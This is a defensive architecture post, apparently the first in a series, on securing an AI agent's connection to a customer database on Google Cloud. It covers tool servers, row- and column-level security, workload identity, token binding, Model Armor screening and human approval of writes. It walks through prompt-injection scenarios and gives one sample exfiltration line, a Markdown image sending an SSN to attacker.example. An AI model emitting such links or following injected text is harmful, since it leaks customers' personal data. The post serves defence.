Agentic Governance on Google Cloud · Episode 01

Securing the Agent-to-Database Connection

I decided to start a series dedicated to Agentic Governance to help engineers and architects fit all the scattered pieces of this puzzle into a single, structured picture. My goal is to make it clear at the top level what kinds of threats are possible when we connect AI agents to real systems, which guardrails prevent them, and how all of those controls fit together end-to-end.

This series is not meant to promise a silver-bullet, 100% foolproof security guarantee—no architecture can. Instead, it is meant to serve as a practical foundation: walking through the known failure modes of agentic systems and bringing the architectural defenses together into one coherent mental model.

When I began researching Agentic Governance, I struggled to find material that explained the end-to-end mechanics in a clear, approachable way. So I started compiling my own architectural notes and diagrams, and I will be sharing them across this series as I work through each topic.

The figure below is where this episode ends: an AI agent reading and writing an internal customer database on Google Cloud, with every control that a security review would expect. 1. Platform-Agnostic Zero-Trust Blueprint (Before Vendor Mapping)

Products like Vertex AI Agent Engine, Google Cloud Agent Gateway, and Model Armor are cloud-specific implementations of deeper architectural primitives. In any production environment—whether you run on Google Cloud, AWS, Azure, or self-hosted Kubernetes—the security of an agent-to-database connection depends on 16 vendor-agnostic building blocks across 5 trust zones and 10 cryptographically verified wire hops.

In the platform-agnostic reference diagram below (Figure 0A), Envoy Proxy serves as the policy enforcement point at both Ingress (B1) and Egress (B3), and content safety ("Model Armor") is represented by its underlying architectural pattern: an inline Envoy External Processor (ext_proc) gRPC Guardrail + Deterministic DLP Tokenizer.

2. Representing "Model Armor" Vendor-Agnostically: Inline Envoy ext_proc gRPC Pipeline

Why This Initial Diagram Breaks: The "Lethal Trifecta" of Agent Security

In an enterprise security review, an AI agent becomes remotely exploitable the moment three capabilities converge in the same execution path. Our initial 3-box diagram connects all three legs at once:

Leg 01 · Untrusted Input

External Text Enters the Context Window

User prompts, webhook payloads, or database rows containing user-submitted text (support tickets, shipping notes, product reviews) are read directly into the LLM prompt context.

Leg 02 · Privileged Access

Broad Data & Tool Authority

The agent holds a shared service account (admin-sa) that can read every customer's rows, view raw PII columns, and invoke UPDATE / DELETE SQL statements.

Leg 03 · Exfiltration or Mutation Sink

Unconfirmed Action or Rendered Leak

A tricked model can immediately mutate database state, call an external API/A2A agent, or exfiltrate rows in a "read-only" chat response via an unsanitized Markdown image (![x](https://attacker.example/leak?ssn=...)).

Core Architectural Rule — Deterministic Boundary vs. Probabilistic Mitigation: Every control we add in Chapters 3–13 is either a Deterministic Boundary (enforced outside the model in code, IAM, network routing, or the database engine—holding 100% of the time even if the LLM is completely hijacked) or a Probabilistic Mitigation (enforced by a classifier or scanner such as Model Armor). Never rely on a Mitigation alone without a Deterministic Boundary behind it.

Why Q3 Deserves Its Own Question

Q1 and Q3 are easy to conflate, but they are different layers of the problem. Q1 asks how the system establishes who is making the request and carries that fact to the database without trusting the prompt. Q3 asks what the database does with that identity once it arrives: even a correctly identified user must receive only the rows and columns they are entitled to see.

Row-Level Security (RLS) is a filter the database engine applies to every query on a table, regardless of how the query was written. If Alice's identity is bound to the connection, a query for SELECT * FROM orders returns only Alice's orders—even if the model omitted the WHERE clause, even if the tool was called with the wrong argument, and even if the prompt was injected. The filter lives in the database, not in the agent's code, so a fooled model cannot remove it.

Column-Level Security (CLS) is the same idea applied to columns. The customers table holds email addresses, physical addresses, payment details, and national identifiers in the same row as the fields the agent needs. CLS ensures that the agent's database identity either cannot read those columns at all or receives a masked value (for example, the last four digits of a card number), so raw PII never enters the model's context window or its logs.

Both controls are needed because the naive design violates both at once: the agent connects with one shared administrative account (so the database cannot distinguish Alice from Bob and RLS has nothing to filter on), and that account can read every column (so CLS is never applied). Answering Q3 therefore depends on answering Q1 first—the database can only enforce per-user access if it knows which user is asking. How this identity binding works differs between a data warehouse and a transactional database, and we cover both in detail in the Row and Column Access Controls section of the full blueprint.

What breaks without it

Show all orders for bob@example.com" produces SELECT * FROM orders WHERE user_id = 'bob', and the database runs it, because the database role the agent connects with is allowed to. The system prompt said not to. The system prompt is advice. What it is

A tool server is a small service that sits between the agent and the database and owns two things the agent should never own: the SQL text and the database connection. The agent calls named operations—get_order(order_id)—and the server runs a statement that was fixed when the server was deployed, with the arguments bound as parameters. The protocol the agent uses to discover and call those operations is the Model Context Protocol (MCP). MCP standardizes the call; it does not restrict what a tool may do. A tool named run_sql(query) is valid MCP and exactly as dangerous as the function it replaced. The protection comes from which tools exist, not from the protocol.

Three properties make the tool server a boundary rather than a convenience: (1) every tool is a fixed statement with typed parameters, so there is no SQL for the model to write; (2) the caller's identity is taken from a verified token and bound to a parameter the model cannot see, so the model cannot choose whose data it asks for; (3) the server connects to the database with its own identity, so the agent holds no database credential at all.

On Google Cloud there are two ready-made ways to run this box, and they differ on the one property that matters here. Google-managed remote MCP servers (for Cloud SQL, AlloyDB, Spanner, BigQuery) are endpoints Google hosts; nothing to deploy, access controlled with IAM. They expose generic, prebuilt database primitives such as execute_sql and execute_sql_readonly. IAM and the database role restrict which tables the agent may query, but execute_sql_readonly still lets a prompt-injected model compose any SELECT it likes and read every row in those tables—the model is still writing the SQL (see Secure agent interactions with the Cloud SQL MCP server).

MCP Toolbox for Databases is the alternative: an open-source MCP server from Google that you deploy yourself (typically on Cloud Run) and configure in a single tools.yaml. Here the tools are statements you wrote, with typed parameters, so the model never writes SQL at all. For an autonomous agent over multi-tenant data this is the only one of the two that closes T1. The eight lines that matter:

tools.yaml — one tool, identity bound from the token
tools:
  get_order:
    source: orders-db                       # IAM auth, private IP
    parameters:
      - name: owner_email
        authServices: [{name: app_jwt, field: email}]
        # ^ filled from the verified token; hidden from the model
      - name: order_id
    statement: SELECT order_id, status FROM app.orders_v
               WHERE owner_email = $1 AND order_id = $2 LIMIT 1;

The agent sees one tool, get_order(order_id). Why does a generic execute_sql tool behave differently on BigQuery than on Cloud SQL? The difference comes down to the database connection model. BigQuery uses a stateless, per-request HTTP/gRPC API: when end-user OAuth passthrough is enabled (useClientOAuth: true), every query carries the caller's own OAuth bearer token and BigQuery bounds even raw execute_sql to that user's IAM Row Access Policies and Column Policy Tags. Cloud SQL, by contrast, relies on a stateful pool of long-lived TCP sockets authenticated under a single shared database role—so to the database engine, every query looks like it came from the same identity, and raw execute_sql allows a prompt-injected agent to read any tenant's rows across the shared pool. We examine that architectural split and the Cloud SQL isolation patterns in Chapter 5.

Dual-Scope Authorization (Effective Scope = Agent Scope ∩ User Delegated Scope) & The Four Governance Pillars

Giving the agent its own SPIFFE principal enables Dual-Scope Authorization: every downstream check evaluates the intersection of what the agent workload is allowed to do and what the human caller is allowed to do (Effective Authority = Agent Scope ∩ User Scope). Even if a super-admin invokes a customer-support agent, the agent cannot access payroll tables outside its own SPIFFE IAM scope; conversely, even if the agent is permitted to call the orders tool server, it can only read the rows belonging to the current user's token. Across Google Cloud's enterprise governance framework, this anchors the four runtime pillars: The Badge (SPIFFE Agent Identity), The Ledger (audit & FinOps telemetry, Chapter 13), The Mandate (verified task intent, Chapter 5 & 12), and The Sanction (least-privilege intersection + HITL write gates).

What breaks without it

Scenario: background job. A nightly run summarizes yesterday's orders. There is no user, so the agent acts with its own authority. If that authority is a service-account key in a config file, the key is the agent: anyone who reads the file (a debugging session, a container image layer, a log line) is the agent, from anywhere, indefinitely. The database sees the same account either way and cannot tell the difference.

What it is

A workload identity is an identity the platform issues to a running process rather than a secret the process carries. The standard for naming such identities is SPIFFE: each workload gets an ID of the form spiffe://trust-domain/path and a short-lived certificate that proves it. The certificate is issued at start-up by the runtime, rotates automatically, and cannot be exported as a file, so there is nothing to steal. Other services verify it the same way a browser verifies a web server—by checking the certificate chain—which is the basis for the mutual TLS we will meet in Chapter 6.

On Google Cloud this is Agent Identity: each agent deployed on Agent Runtime receives its own SPIFFE principal, and IAM policies are written against that principal. The tool server can therefore say "only spiffe://…/orders-agent may invoke me", the database can say "only the tool server's identity may connect", and the agent never holds a password. Two different agents on the same project are two different principals; one cannot borrow the other's permissions.

What breaks without it

Scenario: user reads their data, six months later. A second tool, search_orders(text), is added for a support dashboard. Its author forgets the owner clause. What it is

Row-Level Security (RLS) is a policy attached to a table that the engine evaluates on every query, regardless of who wrote the query or whether it has a WHERE clause. Column-Level Security (CLS) restricts which columns a role may read or returns masked values so raw identifiers never enter the model's context. Writes get the same treatment in reverse: the agent's database role has no direct UPDATE or DELETE privilege and may only EXECUTE a stored procedure that validates ownership and records an idempotency key.

How the user's identity reaches those policies—and why raw execute_sql carries fundamentally different risk on an analytical warehouse versus an operational database—comes down to BigQuery's stateless, per-request HTTP API connection model versus Cloud SQL's stateful, long-lived TCP connection-pooling model:

  • BigQuery (Stateless HTTP + Per-Query IAM Identity): Every query is an independent HTTP/gRPC call carrying the caller's OAuth bearer token in the header (Authorization: Bearer <End-User-OAuth-Token>). Even if 1,000 users talk to one agent, the MCP server attaches each user's OAuth token to their request (useClientOAuth: true), and BigQuery evaluates IAM-native Row Access Policies (SESSION_USER() or SECURE_CONTEXT()) and Dataplex Column Policy Tags dynamically for that specific IAM user on every query job.
  • Cloud SQL (Stateful TCP + Shared Connection Pool): Opening a new TCP socket and running an IAM handshake per query would exhaust max_connections and add high latency. Instead, the MCP server keeps a warm connection pool authenticated under a single shared database role—so to the database engine, every query looks like it came from the same identity, and native table/column GRANT privileges cannot distinguish User A from User B on the wire.

  • 1. One-Way TLS vs. Mutual TLS (mTLS): In ordinary HTTPS (one-way TLS), only the server presents a certificate; the client is anonymous at the transport layer. In Mutual TLS (mTLS), both sides present X.509 certificates during the TLS handshake. The agent presents the short-lived SPIFFE X.509 certificate it received in Chapter 4 (spiffe://…/AGENT_ID), so the Egress Gateway cryptographically verifies which exact agent workload opened the socket before reading a single HTTP header.
  • 2. Bearer Tokens vs. Sender-Constrained Tokens (DPoP, RFC 9449): A bearer token says "whoever holds this string is Alice." DPoP (Demonstrating Proof-of-Possession) binds the token to the caller's private key: on every HTTP request, the caller sends a short-lived DPoP proof JWT signed by its private key covering the HTTP method, target URI (htm, htu), and a hash of the access token (ath). Even if an attacker steals the access token, they cannot use it without the agent's unexportable private key.
  • 3. OAuth 2.1 On-Behalf-Of (OBO) Token Exchange (RFC 8693) vs. KMS-Signed Context JWTs: Instead of forwarding the frontend token T1 (aud=agent-a), the agent (or its egress proxy) calls Auth Manager (or your corporate IdP—Okta, Microsoft Entra, Google Identity—configured under Corporate sign-in with OAuth 2.0 PKCE) to exchange T1 for a downscoped, 5-minute token T2 locked to the exact target tool server (aud=https://orders-mcp.internal, scp=orders:read) and recording the acting agent in the act claim (act: {"sub": "spiffe://…/orders-agent"}). Alternatively, when your application front door owns user authentication, it mints a 5-minute Cloud KMS-signed ES256 Context Token carrying the verified sub, tenant_id, and aud, which MCP Toolbox verifies against an explicit ALLOWED_KIDS key allowlist.

import base64, re, unicodedata
from google.cloud import modelarmor_v1

ZERO_WIDTH_RE = re.compile(r"[​-‏‪-‮⁠-⁯󠀀-󠁿]")
B64_RUN_RE = re.compile(r"[A-Za-z0-9+/]{24,}={0,2}")

def normalize_for_screening(raw_text: str) -> str:
    # Canonicalizes Unicode (NFKC), strips invisible tag chars, and appends decoded Base64 runs.
    text = unicodedata.normalize("NFKC", raw_text)
    text = ZERO_WIDTH_RE.sub("", text)
    decoded_extras = []
    for match in B64_RUN_RE.findall(text):
        try:
            decoded = base64.b64decode(match, validate=True).decode("utf-8", errors="ignore")
            if decoded.isprintable():
                decoded_extras.append(decoded)
        except Exception:
            pass
    return text + ("\n[DECODED_B64]: " + " ".join(decoded_extras) if decoded_extras else "")

def screen_tool_output_fail_closed(tool_response_json: str, template_name: str) -> str:
    # Screens normalized DB tool rows via Model Armor; fails closed on ANY error or match.
    client = modelarmor_v1.ModelArmorClient()
    canonical = normalize_for_screening(tool_response_json)
    resp = client.sanitize_model_response(
        request=modelarmor_v1.SanitizeModelResponseRequest(
            name=template_name,
            model_response_data=modelarmor_v1.DataItem(text=canonical),
        )
    )
    res = resp.sanitization_result
    # Fail closed: require BOTH complete invocation AND zero filter matches!
    if (res.invocation_result != modelarmor_v1.InvocationResult.SUCCESS
            or res.filter_match_state != modelarmor_v1.FilterMatchState.NO_MATCH_FOUND):
        raise ValueError("Blocked by Model Armor egress policy (fail-closed)")
    return tool_response_json

    • Dual-LLM Quarantine & CaMeL Data-Flow Check: When summarizing untrusted free-text columns from the database, a tool-less Quarantine model locked to a strict enum/Pydantic output_schema extracts structured fields first, and a deterministic policy node verifies provenance before any write tool can be proposed.
    • Human-in-the-Loop (RequestInput) Rendering Server-Bound Parameters: Before any write tool (`orders-write-mcp`) executes, the workflow pauses at an ADK 2.x RequestInput node. Crucially, the approval card shown to the human is populated from deterministic workflow state (the exact `order_id`, `amount_usd`, `idempotency_key`, and server-bound `owner_email`), never from LLM-generated prose (`ASI09`).
  • 2. Memory Bank (sessions): Vertex AI Session and Memory Bank storage is keyed by the cryptographically verified `(tenant_id, user_id)` established at the Ingress gateway, and every retrieved memory entry is screened before entering the prompt (`ASI06`).
  • 3. Code sandbox (generated code): Any code execution happens in an isolated, ephemeral gVisor sandbox container with zero network egress and zero access to the agent's SPIFFE identity or tokens (`ASI05`).

from pydantic import BaseModel, Field
from google.adk import LlmAgent, Workflow
from google.adk.nodes import RequestInput
from google.genai.types import ThinkingConfig

class RefundProposal(BaseModel):
    order_id: str = Field(pattern=r"^ORD-[0-9]{3,8}$")
    amount_usd: float = Field(gt=0, le=500.0)
    reason_code: str = Field(pattern=r"^(DAMAGED|LATE_DELIVERY|WRONG_ITEM)$")

# 1. Single-turn model node: proposes structured parameters only; cannot execute writes directly
planner_node = LlmAgent(
    name="refund_planner",
    model="gemini-3.8-flash",
    mode="single_turn",
    thinking_config=ThinkingConfig(thinking_level="LOW"),
    output_schema=RefundProposal,
    instruction="Extract the requested order_id, amount_usd, and reason_code from the user request.",
)

# 2. Deterministic code node: builds approval payload from verified session state + proposal
def build_hitl_card(state: dict, proposal: RefundProposal) -> dict:
    idem_key = str(uuid.uuid5(uuid.NAMESPACE_URL, f"{state['user:id']}:{proposal.order_id}:refund"))
    state["pending_write"] = {
        "verified_caller": state["user:id"],      # From verified JWT, never from LLM!
        "order_id": proposal.order_id,
        "amount_usd": proposal.amount_usd,
        "reason_code": proposal.reason_code,
        "idempotency_key": idem_key,
    }
    return state["pending_write"]

# 3. Human-in-the-Loop pause node: renders exact server-bound parameters for confirmation
approve_write_node = RequestInput(
    name="confirm_refund_write",
    prompt_from_state="pending_write",
)

orders_workflow = Workflow(
    name="governed_orders_agent",
    edges=[
        ("start", planner_node),
        (planner_node, build_hitl_card),
        (build_hitl_card, approve_write_node),
        # Only after explicit human approval does the deterministic writer node call orders-write-mcp!
    ],
)
